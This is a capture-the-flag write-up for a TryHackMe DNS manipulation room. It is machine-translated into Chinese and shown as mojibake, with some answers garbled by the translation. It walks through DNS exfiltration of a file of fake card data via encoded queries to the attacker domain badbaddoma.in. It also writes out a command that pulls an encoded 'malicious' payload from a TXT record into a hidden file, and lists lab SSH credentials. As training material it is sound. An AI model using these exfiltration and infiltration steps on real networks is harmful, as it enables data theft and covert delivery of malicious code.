# DNS æ“çºµå°è¯•é»‘å®¢æŠ€æœ¯

> åŸæ–‡ï¼š<https://infosecwriteups.com/dns-manipulation-tryhackme-writeup-7b625023a9a3?source=collection_archive---------2----------------------->

**ä½œè€… Shamsher khan è¿™æ˜¯ Tryhackme roomâ€œDNS æ“çºµâ€çš„ä¸€ç¯‡æ–‡ç« **

![](img/21e38c69822aaf5ba2e0391582dc86f1.png)

[https://www.tryhackme.com/room/dnsmanipulation](https://www.tryhackme.com/room/dnsmanipulation)

**æˆ¿é—´é“¾æ¥:**[https://www.tryhackme.com/room/dnsmanipulation](https://www.tryhackme.com/room/dnsmanipulation)
**æ³¨:æ­¤æˆ¿å…è´¹**

# ä»»åŠ¡ 1:ä»‹ç»

åœ¨è¿™ä¸ªæˆ¿é—´é‡Œï¼Œæˆ‘ä»¬å°†ç ”ç©¶ DNS å¹¶å±•ç¤ºç”¨äºæ¸—é€æ•°æ®çš„æŠ€æœ¯ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å°†äº†è§£ DNS çš„ç”¨é€”ã€å·¥ä½œåŸç†ä»¥åŠ DNS è®°å½•çš„ç±»å‹ã€‚

ä¸‹å›¾è¯´æ˜äº†ä¸€ä¸ªåŸºæœ¬çš„ DNS æŸ¥æ‰¾ã€‚åœ¨è¿™é‡Œï¼Œå®¢æˆ·æœºé€šè¿‡ DNS æœåŠ¡å™¨å°†å®Œå…¨åˆæ ¼çš„åŸŸå(FQDN)è§£æä¸º IP åœ°å€ã€‚

![](img/178f95c0e0f56b4df7b06af7baaf864e.png)

ç„¶åï¼Œæˆ‘ä»¬å°†è®¨è®ºå¦‚ä½•é€šè¿‡ DNS æŸ¥è¯¢å°† DNS ç”¨ä½œâ€œæ•°æ®è¿‡æ»¤â€å’Œâ€œæ•°æ®æ¸—é€â€å·¥å…·ã€‚

![](img/2b2fc09ea5fd5b41852ccc8eab30f6a9.png)

æœ€åï¼Œæˆ‘ä»¬å°†äº†è§£ DNS éš§é“ï¼Œä»¥åŠå®ƒå¦‚ä½•ç”¨äºé€šè¿‡ DNSâ€œéš§é“â€ä¸åŒçš„åè®®ï¼Œå¦‚(HTTP)ã€‚

# ä»»åŠ¡ 2:å®‰è£…

**ã€ç”¨äº DNS æ¸—é€å’Œæ¸—é€çš„ Python ä»£ç ã€‘**

æˆ‘ä¸ºæ‚¨åˆ›å»ºäº†å‡ ä¸ªç”¨ Python ç¼–å†™çš„ç®€å•è„šæœ¬æ¥å®Œæˆæœ¬æ¼”ç»ƒã€‚è¿™å°†å…è®¸æˆ‘ä»¬å¯¹è¿œç¨‹ DNS æœåŠ¡å™¨è¿›è¡Œ DNS æŸ¥è¯¢ã€‚
`git clone [https://github.com/kleosdc/dns-exfil-infil](https://github.com/kleosdc/dns-exfil-infil)`

æ­¤å¤–ï¼Œç¡®ä¿æ‚¨æ‹¥æœ‰è¿è¡Œ Python ä»£ç æ‰€éœ€çš„ Python3 æ¨¡å—ã€‚

ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…æ‰€éœ€çš„æ¨¡å—:

`sudo pip3 install -r requirements.txt`

**ã€ç”¨äº DNS éš§é“çš„ç¨‹åºã€‘**

[https://github.com/yarrick/iodine](https://github.com/yarrick/iodine)

`sudo apt install iodine`

**ã€ä¸‹è½½ Wiresharkã€‘**

æ‚¨å¯ä»¥ä½¿ç”¨ Wireshark æˆ– tshark æ¥æ•è·æ•°æ®åŒ…ã€‚python ä»£ç ä½¿ç”¨ã€‚PCAP æ–‡ä»¶æå–æ•è·çš„æ•°æ®ï¼Œç„¶åè§£ç å®ƒã€‚
[https://www.wireshark.org/download.html](https://www.wireshark.org/download.html)

`sudo apt install -y tshark`

# ä»»åŠ¡ 3:[è®¾ç½®]è‡ªå®šä¹‰å…¬å…± DNS æœåŠ¡å™¨

å¦‚æœä½ æƒ³å»ºç«‹å’Œæˆ‘ä¸€æ ·çš„ç¯å¢ƒï¼Œä½ éœ€è¦ä¸€ä¸ª**å…¬å…±åŸŸå**å’Œä¸€ä¸ª**å…¬å…±æœåŠ¡å™¨**ã€‚

æˆ‘ä¸ä¼šæ‰©å¤§è´­ä¹°åŸŸåæˆ–æä¾›é¢å‘å…¬ä¼—çš„æœåŠ¡å™¨ï¼Œå› ä¸ºæ²¡æœ‰å¿…è¦å®Œæˆè¿™ä¸ªæˆ¿é—´ã€‚

ç„¶è€Œï¼Œ **STOK** å·²ç»åˆ›å»ºäº†ä¸€ä¸ªå…³äºå¦‚ä½•ä¸º OOB(å¸¦å¤–)æ•°æ®æ¸—é€è®¾ç½®ä¸€åˆ‡çš„ä¼˜ç§€æ•™ç¨‹: [STOK çš„è§†é¢‘](https://www.youtube.com/watch?v=p8wbebEgtDk)

# ä»»åŠ¡ 4:ä»€ä¹ˆæ˜¯ DNSï¼Ÿ

ä»‹ç»

åœ¨é«˜å±‚æ¬¡ä¸Šï¼ŒåŸŸåç³»ç»Ÿæ˜¯æŒ‡ç”¨ IP åœ°å€è§£æåŸŸåçš„å‘½åç³»ç»Ÿã€‚DNS æœåŠ¡å™¨åˆ†å¸ƒåœ¨ä¸–ç•Œå„åœ°ï¼Œå®ƒä»¬ä»¥ä¸€ç§ç³»ç»Ÿçš„æ–¹å¼ä¸æ–­æ›´æ–°å’ŒåŒæ­¥ã€‚å½“ç”¨æˆ·ä½¿ç”¨è¯¸å¦‚ tryhackme.com[ä¹‹ç±»çš„åŸŸåå‘å‡ºè¯·æ±‚æ—¶ï¼ŒDNS ä¼šå°†å…¶â€œç¿»è¯‘â€æˆ IP åœ°å€ï¼Œç„¶åæœ€ç»ˆå‘è¯·æ±‚è€…æä¾›æ­£ç¡®çš„ IP åœ°å€ã€‚è¿˜å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚æœ DNS è®°å½•ç”± Cloudflare çš„ DDoS protection ç­‰æœåŠ¡ä»£ç†ï¼Œåˆ™ DNS è¿”å›çš„ IP åœ°å€å¹¶ä¸æ€»æ˜¯åŸå§‹æœåŠ¡å™¨çš„ IP åœ°å€ã€‚](http://tryhackme.com)

ä»æŠ€æœ¯ä¸Šæ¥è¯´ï¼Œæ¯å°è¿æ¥åˆ°äº’è”ç½‘çš„è®¾å¤‡éƒ½æœ‰ä¸€ä¸ª IP åœ°å€ï¼Œåœ¨ä¸å…¶ä»–äº’è”ç½‘è®¾å¤‡é€šä¿¡æ—¶ï¼Œè¯¥åœ°å€å……å½“èº«ä»½æ ‡è¯†ã€‚å› æ­¤ï¼Œäº†è§£ DNS çš„ä¸»è¦åŠŸèƒ½å’Œâ€œç¿»è¯‘â€æ‰€ç»å†çš„å±‚æ¬¡ç»“æ„è‡³å…³é‡è¦ã€‚

DNS æ ¹åŸŸåæœåŠ¡å™¨ä½äº DNS å±‚æ¬¡ç»“æ„çš„é¡¶ç«¯æˆ–â€œæ ¹â€,åœ¨äº’è”ç½‘ä¸­æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚æ‰€æœ‰é¡¶çº§åŸŸå(TLD)â€œåŒºåŸŸâ€çš„ä¿¡æ¯ï¼Œå¦‚ã€‚comï¼Œco.ukï¼Œã€‚net åŠå…¶ç›¸å…³çš„åŸŸåæœåŠ¡å™¨ä½äºåˆ†å¸ƒåœ¨ä¸–ç•Œå„åœ°çš„æ•°ç™¾ä¸ªæ ¹åŸŸåæœåŠ¡å™¨ä¸­ã€‚

ä¸‹é¢æ˜¯ Cloudflare çš„ä¸€ä¸ªæ’å›¾ï¼Œå¯ä»¥æ›´å¥½åœ°æè¿°è¿™ç§å±‚æ¬¡ç»“æ„ã€‚

![](img/f9fdec541fbcf44989aa366a46c66e18.png)

æ¥æº:[https://www . cloud flare . com/learning/DNS/glossary/DNS-root-server/](https://www.cloudflare.com/learning/dns/glossary/dns-root-server/)

ä»¥ä¸‹æ˜¯åŒ…å«æ ¹æœåŠ¡å™¨å’Œ DNS åŒºåŸŸæ›´å¤šä¿¡æ¯çš„ä¸€äº›èµ„æº:

[https://www . cloud flare . com/learning/DNS/glossary/DNS-root-server/](https://www.cloudflare.com/learning/dns/glossary/dns-root-server/)

[https://www.cloudflare.com/learning/dns/glossary/dns-zone/](https://www.cloudflare.com/learning/dns/glossary/dns-zone/)

[https://www.iana.org/domains/root/servers](https://www.iana.org/domains/root/servers)

æœ‰æ›´å¤šçš„ DNS è®°å½•ç±»å‹ã€‚ä½†æ˜¯ï¼Œä¸ºäº†å®Œæˆæœ¬æ¼”ç»ƒï¼Œæ²¡æœ‰å¿…è¦çŸ¥é“å®ƒä»¬ã€‚

å¦‚æœæ‚¨æƒ³äº†è§£æœ‰å…³ DNS è®°å½•ç±»å‹çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒæœ¬æ–‡:

https://www.cloudflare.com/learning/dns/dns-records/ã€‚

**é—®é¢˜ 1:** å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ Windowsï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤æ¥æŸ¥è¯¢â€œyoutube.comâ€çš„ txt è®°å½•ï¼Ÿ

> ã€youtube.comã€‘ç­”æ¡ˆ:nslookup-type = txt

**é—®é¢˜ 2:** å¦‚æœä½ åœ¨ Linux ä¸Šï¼Œå¯ä»¥ç”¨ä»€ä¹ˆå‘½ä»¤æ¥æŸ¥è¯¢â€œfacebook.comâ€çš„ txt è®°å½•ï¼Ÿ

> **å›ç­”:æŒ– facebook.com txt**

**é—® 3:** AAAA ä¼šå°†å“ªç§ç±»å‹çš„ IP åœ°å€ä¸ä¸»æœºåä¸€èµ·å­˜å‚¨ï¼Ÿ

> **ç­”æ¡ˆ:IPv6**

**é—®é¢˜ 4:**DNS TXT è®°å½•çš„æœ€å¤§å­—ç¬¦æ•°ä¸º 256ã€‚(æ˜¯/ä¸æ˜¯)

> **å›ç­”:å¦**

**é—® 5:** ä»€ä¹ˆ DNS è®°å½•åœ¨åå‘æŸ¥æ‰¾ä¸­æä¾›åŸŸåï¼Ÿ(ç ”ç©¶)

> **ç­”æ¡ˆ:PTR**

**é—®é¢˜ 6:** ä»¥ä¸‹ IPv4 åœ°å€çš„åå‘æŸ¥æ‰¾æ˜¯ä»€ä¹ˆï¼Ÿ(192.168.203.2)(ç ”ç©¶)

![](img/da6e149cfca7549c58f717e48c862a91.png)

> **ç­”æ¡ˆ:2.203.168.192.in-addr.arpa**

# ä»»åŠ¡ 5:ä»€ä¹ˆæ˜¯ DNS æ¸—å‡ºï¼Ÿ

DNS æ¸—é€æ˜¯é€šè¿‡ DNS å¯¹æœåŠ¡å™¨è¿›è¡Œçš„ç½‘ç»œæ”»å‡»ï¼Œæ ¹æ®æ”»å‡»è€…çš„ç‰©ç†ä½ç½®å’Œä¸ç›®æ ‡è®¾å¤‡çš„æ¥è¿‘ç¨‹åº¦ï¼Œå¯ä»¥æ‰‹åŠ¨æˆ–è‡ªåŠ¨æ‰§è¡Œã€‚åœ¨æ‰‹åŠ¨æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šè·å¾—å¯¹ç›®æ ‡è®¾å¤‡çš„æœªç»æˆæƒçš„ç‰©ç†è®¿é—®æƒï¼Œä»¥ä¾¿ä»ç¯å¢ƒä¸­æå–æ•°æ®ã€‚è€Œåœ¨è‡ªåŠ¨ DNS æ¸—é€ä¸­ï¼Œæ”»å‡»è€…ä½¿ç”¨æ¶æ„è½¯ä»¶åœ¨å—æŸç½‘ç»œå†…éƒ¨è¿›è¡Œæ•°æ®æ¸—é€ã€‚

DNS æ˜¯ä¸€ç§é€šå¸¸åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šå¯ç”¨çš„æœåŠ¡ï¼Œé€šå¸¸å…è®¸ TCP æˆ– UDP ç«¯å£ 53 ä¸Šçš„å‡ºç«™æµé‡ã€‚è¿™ä½¿å¾— DNS æˆä¸ºé»‘å®¢ç”¨æ¥æ³„éœ²æ•°æ®çš„é¦–é€‰ã€‚

é€šè¿‡ DNS çš„æ•°æ®æ³„æ¼å¯èƒ½å…è®¸æ”»å‡»è€…ä»ç›®æ ‡ç¯å¢ƒä¸­ä¼ è¾“å¤§é‡æ•°æ®ã€‚æ­¤å¤–ï¼ŒDNS æ¸—é€ä¸»è¦ç”¨ä½œæ”¶é›†ä¸ªäººä¿¡æ¯çš„é€”å¾„ï¼Œå¦‚ç¤¾ä¼šå®‰å…¨å·ç ã€çŸ¥è¯†äº§æƒæˆ–å…¶ä»–ä¸ªäººèº«ä»½ä¿¡æ¯ã€‚

DNS è¿‡æ»¤ä¸»è¦é€šè¿‡å‘ DNS UDP è¯·æ±‚æ·»åŠ åŒ…å«æ‰€éœ€â€œlootâ€çš„å­—ç¬¦ä¸²æ¥ä½¿ç”¨ã€‚ç„¶åï¼ŒåŒ…å« loot çš„å­—ç¬¦ä¸²å°†è¢«å‘é€åˆ°è®°å½•è¿™äº›è¯·æ±‚çš„æµæ°“ DNS æœåŠ¡å™¨ã€‚å¯¹äºæœªç»åŸ¹è®­çš„äººæ¥è¯´ï¼Œè¿™å¯èƒ½çœ‹èµ·æ¥åƒæ­£å¸¸çš„ DNS æµé‡ï¼Œæˆ–è€…è¿™äº›è¯·æ±‚å¯èƒ½ä¼šåœ¨è®¸å¤šåˆæ³• DNS è¯·æ±‚çš„æ··ä¹±ä¸­ä¸¢å¤±ã€‚

**é—® 1:**DNS åç§°çš„æœ€å¤§é•¿åº¦æ˜¯å¤šå°‘ï¼Ÿ(ç ”ç©¶)(**é•¿åº¦åŒ…æ‹¬åœ†ç‚¹ï¼**)

> **ç­”æ¡ˆ:253**

# ä»»åŠ¡ 6: DNS æ¸—é€â€”æ¼”ç¤º

ä»‹ç»

åœ¨è¿™ä¸ªç¤ºä¾‹åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…è¯•å›¾å°†æ•°æ®æ³„æ¼åˆ°ä»–ä»¬çš„ç³»ç»Ÿä¸­ï¼Œå¹¶å†³å®šä»–ä»¬çš„æœ€ä½³é€‰æ‹©æ˜¯ä½¿ç”¨ DNS æŸ¥è¯¢ã€‚æ”»å‡»è€…çš„ç›®æ ‡æ˜¯ä» SecureCorp ç½‘ç»œä¸Šçš„æœºå™¨ä¸­æ³„æ¼æ•æ„Ÿä¿¡æ¯ã€‚åœ¨è¿™ä¸ªæ¼”ç¤ºä¸­ï¼Œæˆ‘å°†å±•ç¤ºæ”»å‡»è€…å¯èƒ½é‡‡å–çš„æ­¥éª¤ï¼Œä»¥ä¾¿ä»å—æŸçš„æœºå™¨ä¸­æ³„æ¼è¿™äº›æ•°æ®ã€‚

![](img/d37014749e84df4fb854d345c4a605c6.png)

ä»¥ä¸‹ææ–™æ˜¯é€šè¿‡å‡ä¿¡ç”¨å¡ç”Ÿæˆå™¨ç”Ÿæˆçš„ã€‚æ‰€æœ‰ä¿¡ç”¨å¡ä¿¡æ¯éƒ½æ˜¯å‡çš„ã€‚

è¿™ä¸ªæ¼”ç¤ºä½¿ç”¨çš„æ–‡ä»¶åœ¨æˆ‘åœ¨ GitHub ä¸Šçš„ dns-exfil-infil repo ä¸­ã€‚ä½ å°†éœ€è¦æ–‡ä»¶æ¥å®Œæˆæˆ¿é—´çš„å…¶ä½™éƒ¨åˆ†ã€‚

1.  secure corp . txt([https://github . com/kleosdc/DNS-exfil-infil/blob/main/secure corp . txt](https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt)
2.  packet y . py([https://github . com/kleosdc/DNS-exfil-infil/blob/main/packet y . py](https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py))
3.  packet grabber . py([https://github . com/kleosdc/DNS-exfil-infil/blob/main/packet grabber . py](https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py))

1.åŒ…å«å‡ä¿¡ç”¨å¡å·ç ï¼Œå§“åï¼Œåœ°å€çš„æ–‡æœ¬æ–‡ä»¶ã€‚

![](img/082a9e7bd6cd391d3dd5fd6f058a4a21.png)

2.packet y . py([https://github.com/kleosdc/dns-exfil-infil](https://github.com/kleosdc/dns-exfil-infil))

å½“æ‰§è¡Œ [packety.py](http://packety.py/) æ—¶ï¼Œæ‚¨éœ€è¦ä¸ºè„šæœ¬æä¾›ä»¥ä¸‹è¾“å…¥:

* **æ–‡ä»¶å**:(è¿™æ˜¯æ‚¨è¯•å›¾ä» SecureCorp çš„ç½‘ç»œä¸­æ³„æ¼çš„æ–‡ä»¶(å»ºè®®ä½¿ç”¨æ–‡æœ¬æ–‡ä»¶)

* **åŸŸå**:(è¿™æ˜¯ä½ è¦æ”¾åŸŸåçš„åœ°æ–¹ï¼Œæ¯”å¦‚æˆ‘çš„åŸŸåæ˜¯ badbaddoma.in)

![](img/91b584ee723a799c750c60c17f9b2bd7.png)

python packety.py

æ–‡ä»¶å:securecorp.txt

åŸŸå(ä¾‹å¦‚:badbaddoma.in): badbaddoma.in

[+]æ­£åœ¨è¯»å–æ–‡ä»¶ã€‚

[+] Base64 ç¼–ç ã€‚

[+] Base58 ç¼–ç ã€‚

å¼€å§‹ä¼ è¾“â€¦[æŒ‰å›è½¦é”®]

ä»£ç ä»è¯»å–æ–‡æœ¬æ–‡ä»¶å¼€å§‹ã€‚æ–‡æœ¬æ–‡ä»¶çš„å†…å®¹å°†é¦–å…ˆè¿›è¡Œ Base64 ç¼–ç ï¼Œç„¶åè¿›è¡Œ Base58 ç¼–ç ã€‚è¿™ç•™ç»™æˆ‘ä»¬ä¸€ä¸ªé•¿çš„ç¼–ç å­—ç¬¦ä¸²ã€‚ç„¶åï¼Œå­—ç¬¦ä¸²è¢«åˆ†æˆ 20 ä¸ªå­—ç¬¦é•¿çš„éƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†å°†æ·»åŠ  3 ä¸ªâ€œè™šæ‹Ÿâ€å­—ç¬¦ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥æ··æ·†ã€‚ä¸€ä¸ªå­—ç¬¦å°†è¢«æ·»åŠ åˆ°ç¼–ç å­—ç¬¦ä¸²çš„å‰é¢ï¼Œä¸¤ä¸ªå­—ç¬¦å°†è¢«æ·»åŠ åˆ°åé¢ã€‚

ä¾‹å¦‚ï¼Œç¼–ç æ•°æ®çš„ä¸€éƒ¨åˆ†å¯èƒ½å¦‚ä¸‹æ‰€ç¤º:'**6 gfghhjywsas 3r 4g hda 3**'ã€‚åœ¨æ·»åŠ é¢å¤–çš„å­—ç¬¦åï¼Œå®ƒå°†ä»¥â€œ**x 6 gfghhjywsas 3r g 4 hda 3 Yu**â€ç»“æŸã€‚

ä¸€æ—¦ä¸€åˆ‡éƒ½è¢«ç¼–ç å¹¶å‡†å¤‡å¥½ï¼Œä»£ç å°†ç­‰å¾…ç”¨æˆ·æŒ‰ä¸‹â€œENTERâ€é”®ï¼Œä»¥ä¾¿å¼€å§‹å°†æŸ¥è¯¢ä¼ è¾“åˆ° DNS æœåŠ¡å™¨ã€‚DNS æœåŠ¡å™¨å¯èƒ½å·²ç»è®¾ç½®ä¸ºä½¿ç”¨â€œWiresharkâ€æˆ–â€œtsharkâ€æ¥æ•è·ä¼ å…¥çš„è¯·æ±‚ã€‚

![](img/4e9781062eac921f96570809bb2ecbd8.png)

ç„¶åå°±æ˜¯ç­‰ä¼ è¾“è¾¾åˆ° 100%çš„é—®é¢˜äº†ã€‚å¦‚æœä»»ä½•ä¸€ä¸ªæŸ¥è¯¢æ²¡æœ‰æŒ‰æ­£ç¡®çš„é¡ºåºæŒ‰æ—¶æäº¤ï¼Œé‚£ä¹ˆæ³„éœ²çš„æ•°æ®å°†æ˜¯ä¸å®Œæ•´çš„ï¼Œå¯¹æ”»å‡»è€…æ¥è¯´æ˜¯æ— ç”¨çš„ã€‚

![](img/c2a09619e0a117ff01d5256768f82c64.png)![](img/50448fca5299e34f492881f109e30024.png)

3.packet grabber . py([https://github.com/kleosdc/dns-exfil-infil](https://github.com/kleosdc/dns-exfil-infil))

è¯¥ä»£ç å°†è¦æ±‚ç”¨æˆ·è¾“å…¥ä»¥ä¸‹å†…å®¹:

* **æ–‡ä»¶è¢«æ•è·**:è¿™æ˜¯ã€‚æ‚¨åœ¨ DNS æœåŠ¡å™¨ä¸Šæ•è·çš„ pcap æ–‡ä»¶ã€‚

* **æ–‡ä»¶åè¾“å‡º**:è¿™æ˜¯ä¿å­˜è§£ç æ•°æ®çš„æ–‡ä»¶åã€‚

* **åŸŸå**:è¿™å°†æ˜¯ä½ çš„åŸŸåã€‚

![](img/ec3f4fb5a8430aa375f764b6b2c692bd.png)![](img/fa57ce32217153bc685f5e094e861b86.png)

å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œæ²¡æœ‰ä¸¢å¤±ä»»ä½•æŸ¥è¯¢ï¼Œå¹¶ä¸”æ‰€æœ‰è¾“å…¥éƒ½æ˜¯æ­£ç¡®çš„ï¼›åŒ…å«è§£ç æ•°æ®çš„æ–‡ä»¶å°†ä¿å­˜åœ¨è¿è¡Œä»£ç çš„ç›®å½•ä¸­ã€‚

![](img/3783fcef873265a165055b397f0cc845.png)

# ä»»åŠ¡ 7: DNS æ¸—é€â€”ç»ƒä¹ 

SSH å‡­æ®:

```
Username: user
Password: P@ssword01
```

![](img/19809ee6786ad4a6a5c2e3a036ddc8d5.png)

æˆ‘ä½¿ç”¨é—®é¢˜ä¸­æä¾›çš„ ssh å‡­è¯ç™»å½•ã€‚

![](img/31662e3972bd106ba65db176eef88436.png)

ç„¶åæˆ‘åœ¨ order.pcap ä¸Šè¿è¡Œ packetyGrabber

![](img/2d34fb86f75fd04232518339b46ace3e.png)

**Q.1:** äº¤æ˜“åç§°æ˜¯ä»€ä¹ˆï¼Ÿ(æŒ‰æ‚¨çœ‹åˆ°çš„æ ·å­é”®å…¥)

> ***ç­”æ¡ˆ:ç½‘ç»œè£…å¤‡ã€‚***

**é—®é¢˜ 2:** é˜²ç«å¢™å¤šå°‘é’±ï¼Ÿ(ä¸å¸¦ç¾å…ƒ)

> **ç­”æ¡ˆ:2500**

**é—® 3:** å“ªä¸ªæ–‡ä»¶åŒ…å«å¯ç–‘çš„ DNS æŸ¥è¯¢ï¼Ÿ

> **ç­”æ¡ˆ:*cap 3 . pcap***

![](img/d68c1b3951d9b70ec1de7d0b289e9c8f.png)![](img/8eb842d24fb54a53e834ba965c97864b.png)

**é—®é¢˜ 4:** ä½¿ç”¨~/dns-exfil-infil/ folder ä¸­çš„ packetyGrabber.py å¯¹æ•°æ®è¿›è¡Œè§£ç åï¼Œè¾“å…¥çº¯æ–‡æœ¬ã€‚

> ***å›ç­”:ç®¡ç†å‘˜:s3cre7P@ssword***

# ä»»åŠ¡ 8:ä»€ä¹ˆæ˜¯ DNS æ¸—é€ï¼Ÿ

DNS æ¸—é€æ˜¯æ”»å‡»è€…åˆ©ç”¨ç»„ç»‡çš„åŸŸåç³»ç»Ÿä¸­çš„å„ç§æ¼æ´çš„å¦ä¸€ç§æ–¹æ³•ã€‚ä¸ DNS ä¸Šçš„æ¸—é€æ”»å‡»ä¸åŒï¼Œæ¸—é€å®šä¹‰äº†è¿è¡Œæ¶æ„ä»£ç æ¥æ“çºµ DNS æœåŠ¡å™¨çš„è¿‡ç¨‹ï¼Œè¿™ç§æ“ä½œæˆ–è€…ä½¿ç”¨æ”»å‡»è€…è¿œç¨‹è¿æ¥åˆ°ç½‘ç»œåŸºç¡€è®¾æ–½çš„è‡ªåŠ¨ç³»ç»Ÿï¼Œæˆ–è€…æ‰‹åŠ¨è¿›è¡Œã€‚

DNS æ¸—é€ä¸»è¦ç”¨äºæ–‡ä»¶ä¸¢å¼ƒæˆ–æ¶æ„è½¯ä»¶å‡çº§ã€‚å€ŸåŠ©åŸºäºè¡Œä¸ºã€ç‰¹å¾æˆ–ä¿¡èª‰çš„å¨èƒæ£€æµ‹ç³»ç»Ÿï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æœ‰å¯èƒ½è¢«æ•è·ã€‚

ä½†æ˜¯ï¼Œå¦‚æœè¿™ç§ä¼ è¾“æ•°æ®çš„æ–¹æ³•ä¸è¢«æ³¨æ„ï¼Œå®ƒå¯èƒ½ä¼šå¯¼è‡´æ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚åœ¨ç»„ç»‡çš„ç¯å¢ƒä¸­æ‰§è¡Œä»£ç ã€‚ä»å†å²ä¸Šçœ‹ï¼Œè¿™ç»™è®¸å¤šè‘—åçš„å…¬å¸å¸¦æ¥äº†å·¨å¤§çš„ç ´åå’Œæ··ä¹±ã€‚

æ€»ä¹‹ï¼ŒDNS åè®®å¯ç”¨ä½œéšè”½åè®®ï¼Œæœ‰åŠ©äºæ¶æ„è½¯ä»¶å‡†å¤‡å’Œæ‰§è¡Œä¸æ”»å‡»è€…çš„ C2(å‘½ä»¤å’Œæ§åˆ¶)æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚åœ¨ä¸‹ä¸€ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨å¦‚ä½•å®ç°ã€‚

**é—® 1:** é€šå¸¸ä½¿ç”¨ä»€ä¹ˆç±»å‹çš„ DNS è®°å½•å°†æ•°æ®æ¸—é€åˆ°ç½‘ç»œä¸­ï¼Ÿ

> **ç­”æ¡ˆ:txt**

# ä»»åŠ¡ 9: DNS æ¸—é€â€”æ¼”ç¤º

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…ä¼šå°†ä¸€æ®µâ€œæ¶æ„â€ä»£ç æ¸—é€åˆ°å—å®³è€…çš„è®¡ç®—æœºä¸Šã€‚ç°å®ä¸–ç•Œä¸­çš„æ”»å‡»è€…ä½¿ç”¨è®¸å¤šä¸åŒçš„æŠ€æœ¯æ¥å®ç°è¿™ä¸€ç‚¹ã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘å°†ä½¿ç”¨ä¸€ä¸ªè®¾ç½®åœ¨æˆ‘çš„å…¬å…± AWS DNS æœåŠ¡å™¨ä¸Šçš„ TXT è®°å½•ã€‚åŒ…å«åœ¨è¯¥è®°å½•ä¸­çš„å€¼è¢«ç¼–ç ä¸ºâ€œæ¶æ„â€ä»£ç ã€‚

ç”±äº TXT è®°å½•è¢«é™åˆ¶ä¸º 255 ä¸ªå­—ç¬¦ï¼Œé»‘å®¢å¾ˆå¯èƒ½ä¼šä¸ºä»–ä»¬çš„ DNS æœåŠ¡å™¨é…ç½®å¤šä¸ª TXT è®°å½•ã€‚è¿™æœ€ç»ˆå–å†³äºä»–ä»¬çš„ä»£ç æœ‰å¤šé•¿ã€‚æ—¢ç„¶ä¸€åˆ‡éƒ½å·²è®¾ç½®å°±ç»ªï¼›é»‘å®¢éœ€è¦åšçš„åªæ˜¯è¯·æ±‚é‚£äº› TXT è®°å½•ï¼Œè·å–å€¼ï¼Œè§£ç å®ƒä»¬ï¼Œç„¶åçˆ†ç‚¸..ä»–ä»¬ç°åœ¨å·²ç»é€šè¿‡ DNS TXT è®°å½•å°†è‡ªå·±çš„ä»£ç æ¸—é€åˆ°ä¸€ä¸ªè¢«å…¥ä¾µçš„ç³»ç»Ÿä¸­ã€‚

![](img/ced771b811b53643b0db3b9b0c9727a5.png)

ä¸‹é¢å¯ä»¥çœ‹åˆ°æˆ‘çš„ TXT è®°å½•ã€‚

![](img/fe3183ee0caa0a0aa41fb86b94b49ac8.png)

ç”¨äºæ­¤æ¼”ç¤ºçš„æ–‡ä»¶

1.`nslookup`

è¿™å°†é¦–å…ˆæŸ¥æ‰¾ rt1.badbaddoma.in çš„ TXT è®°å½•ï¼Œç„¶åè·å–å¼•å·å†…çš„å€¼ï¼Œæœ€åå°†è¯¥å€¼ä¿å­˜åˆ°åä¸ºâ€œ. mal.pyâ€çš„æ–‡ä»¶ä¸­ã€‚

`nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py`

2.packet simple . py([https://github.com/kleosdc/dns-exfil-infil](https://github.com/kleosdc/dns-exfil-infil)

å½“ä»£ç è¦æ±‚æ‚¨è¾“å…¥â€œæ–‡ä»¶åâ€æ—¶ï¼Œè¯·è¾“å…¥æ–‡ä»¶åâ€œ. mal.pyâ€ã€‚è¿™æ˜¯æˆ‘ä»¬ä¿å­˜ç¼–ç å€¼çš„æ–‡ä»¶ã€‚

![](img/148bc162c65143652b2b8fc0d66556ca.png)![](img/1aeb2836e325b510acd8ca5a030013a1.png)

# ä»»åŠ¡ 10: DNS æ¸—é€â€”ç»ƒä¹ 

ä½¿ç”¨æ¥è‡ª**ã€ä»»åŠ¡ 7ã€‘DNS æ¸—é€â€”ç»ƒä¹ **çš„ç›¸åŒè™šæ‹Ÿæœºã€‚

é˜…è¯»åœ¨`~/challenges/infiltration/`æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°çš„ä»»åŠ¡æ–‡ä»¶ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨[ä»»åŠ¡ 9] DNS æ¸—é€-æ¼”ç¤ºä¸­ä½¿ç”¨çš„ç›¸åŒå‘½ä»¤ã€‚è¯·è®°ä½ï¼Œæ‚¨éœ€è¦è°ƒæ•´â€œgrepâ€éƒ¨åˆ†ï¼Œå¹¶ä½¿ç”¨é€‚å½“çš„å­—ç¬¦è¿›è¡ŒåŒ¹é…ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ TXT è®°å½•ä¸­çš„æ–‡æœ¬å€¼ä»¥â€œG6â€¦â€å¼€å¤´ï¼Œåˆ™éœ€è¦ä½¿ç”¨â€œgrep G6â€ã€‚

